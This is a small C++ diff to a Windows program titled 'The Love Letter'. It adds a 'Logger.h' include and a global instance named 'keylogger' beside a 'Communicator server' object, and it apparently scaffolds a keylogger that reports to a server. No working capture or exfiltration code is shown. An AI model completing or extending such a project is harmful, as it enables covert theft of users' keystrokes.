@@ -5,13 +5,15 @@
 #include <string>
 #include <fstream>
 #include "Communicator.h"
+#include "Logger.h"
 
+// instances
 Communicator server;
+Logger keylogger;
 
 /// <summary>
 /// The main entry point of the entire program.
 /// </summary>
 int WINAPI wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PWSTR pCmdLine, int nCmdShow) {
-
 	std::cout << "The Love Letter\r\n";
 }
